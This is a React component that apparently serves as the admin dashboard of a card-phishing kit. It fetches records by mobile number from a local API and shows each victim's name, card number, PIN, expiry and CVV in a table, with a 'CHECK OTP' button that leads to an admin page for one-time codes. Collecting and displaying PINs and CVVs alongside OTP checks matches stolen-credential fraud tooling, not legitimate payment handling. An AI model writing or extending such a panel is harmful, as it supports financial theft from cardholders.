import { useLocation, useNavigate } from "react-router-dom";
import { useEffect, useState } from "react";
import "./FullDetails.css";

export default function FullDetails() {
  const location = useLocation();
  const navigate = useNavigate();

  const mobile = location.state?.mobile || localStorage.getItem("mobile");

  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);

  // Fetch cards function
  const fetchCards = () => {
    if (!mobile) return;
    setLoading(true);

    fetch(`http://127.0.0.1:5000/api/cards/cardDetails/${mobile}`)
      .then((res) => res.json())
      .then((data) => {
        setCards(data);
        setLoading(false);
      })
      .catch((err) => {
        console.error("Fetch error:", err);
        setLoading(false);
      });
  };

  // Navigate to OTP page
  const goToOTP = () => {
    navigate("/admin/otp-check");
  };

  // Fetch on mount
  useEffect(() => {
    fetchCards();
  }, [mobile]);

  return (
    <div className="full-container">
      {/* TOP HEADER: Title + Buttons in one line */}
      <div className="top-header">
        <h2>User Card Details</h2>
        <div className="header-buttons">
          <button className="otp-btn-small" onClick={fetchCards}>
            REFRESH
          </button>
          <button className="otp-btn-small" onClick={goToOTP}>
            CHECK OTP
          </button>
        </div>
      </div>

      {/* CARD DETAILS */}
      <div className="full-card">
        <div className="mobile-box">
          <span>Mobile Number:</span> {mobile || "N/A"}
        </div>

        {loading ? (
          <p className="loading">Loading data...</p>
        ) : cards.length === 0 ? (
          <p className="no-data">No data found</p>
        ) : (
          <div className="table-wrapper">
            <table className="styled-table">
              <thead>
                <tr>
                  <th>Name</th>
                  <th>Card Number</th>
                  <th>PIN</th>
                  <th>Expiry</th>
                  <th>CVV</th>
                </tr>
              </thead>
              <tbody>
                {cards.map((card) => (
                  <tr key={card._id}>
                    <td>{card.name}</td>
                    <td>{card.cardNumber}</td>
                    <td>{card.pin}</td>
                    <td>
                      {card.expiryMonth}/{card.expiryYear}
                    </td>
                    <td>{card.cvv}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}